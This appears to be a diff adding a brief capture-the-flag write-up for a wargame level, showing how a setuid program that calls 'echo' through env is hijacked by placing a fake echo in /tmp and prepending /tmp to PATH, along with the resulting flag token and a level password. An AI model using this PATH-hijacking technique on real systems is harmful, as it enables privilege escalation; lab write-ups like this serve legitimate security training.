@@ -1,0 +1,21 @@
+kooda2puivaav1idi4f57q8iq
+
+<- strings level03
+-> ...
+-> /usr/bin/env echo Exploit me
+-> ...
+
+so level03 use of a syscall of the function at this path. We can use a case of symbolic link exploit.
+So we'll replace the echo call by getflag.
+
+We wrote the wanted call
+<- echo "/bin/getflag" > /tmp/echo
+<- chmod 777 /tmp/echo
+
+We add the path to our "echo"
+<- export PATH=/tmp:$PATH
+
+Then by the call of echo, it launch the what's in the file's path:
+
+<- ./level03
+-> Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
